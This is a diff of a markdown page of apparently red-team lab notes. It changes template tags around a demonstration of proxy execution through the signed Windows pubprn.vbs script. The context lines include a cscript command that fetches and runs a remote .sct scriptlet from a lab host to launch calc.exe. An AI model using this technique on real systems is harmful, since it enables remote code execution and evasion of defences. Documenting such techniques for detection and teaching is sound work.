@@ -10,8 +10,8 @@ description: >-
 
 Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml that will be executed by the script:
 
-{% code-tabs %}
-{% code-tabs-item title="http://192.168.2.71/tools/mitre/proxy-script/proxy.sct" %}
+{% tabs %}
+{% tab title="http://192.168.2.71/tools/mitre/proxy-script/proxy.sct" %}
 ```markup
 <?XML version="1.0"?>
 <scriptlet>
@@ -32,16 +32,16 @@ Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml tha
 
 </scriptlet>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://192.168.2.71/tools/mitre/proxy-script/proxy.sct
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## Observations
 
